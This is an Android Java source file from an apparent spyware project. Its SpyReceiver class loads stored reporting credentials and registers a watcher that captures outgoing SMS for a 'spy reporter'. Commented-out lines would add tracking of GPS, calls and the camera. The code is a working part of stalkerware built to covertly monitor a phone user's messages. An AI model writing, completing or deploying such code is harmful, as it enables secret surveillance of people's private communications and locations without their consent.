package com.example.spyapp.receiver;



import com.example.spyapp.listenoutgoingcall.AndroidBroadcastReceiver;
import com.example.spyapp.listenoutgoingcall.AndroidEvent;
import com.example.spyapp.listenoutgoingcall.Logger;
import com.example.spyapp.listenoutgoingcall.SmsSpyReporter;
import com.example.spyapp.listenoutgoingcall.SpyReporter;
import com.example.spyapp.listenoutgoingcall.Watchdog;
import com.example.spyapp.listenoutgoingcall.Watcher;
import com.example.spyapp.sms.SendSMSDetector;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * @author khoanguyen
 */
public class SpyReceiver extends AndroidBroadcastReceiver {
	public static final String APPLICATION_TAG = "spiderman";
	public static final String PASSWORD_FIELD = "password";
	public static final String USERNAME_FIELD = "username";

	@Override
	protected void initialize(Watchdog watchdog, AndroidEvent event) {
		// Yeah, I also want to read my configuration from local preferences
		SharedPreferences settings = event.getContext().getSharedPreferences(
				APPLICATION_TAG, Context.MODE_PRIVATE);
		String username = settings.getString(USERNAME_FIELD, "");
		String password = settings.getString(PASSWORD_FIELD, "");
		SpyReporter.getSpyLogger().setAuthCredentials(username, password);

		Watcher[] watchers = new Watcher[] {
			// I want to monitor GPS activities
		//	new AndroidGpsWatcher(new GpsSpyReporter()),
			// I want to monitor SMS activities
			new SendSMSDetector(new SmsSpyReporter()),
			// I want to monitor Call activities
		//	new AndroidCallWatcher(new CallSpyReporter()),
			// I want to monitor Media activities
		//	new AndroidCameraWatcher(new MediaSpyReporter(username)),
			// I want to bring up configuration dialog
		//	new ConfiguratingWatcher()
		};
		for (Watcher watcher : watchers) {
			watchdog.register(watcher.getObserver());
		}

		Logger.getDefault().debug("Registered watchers successfully!");
	}
}
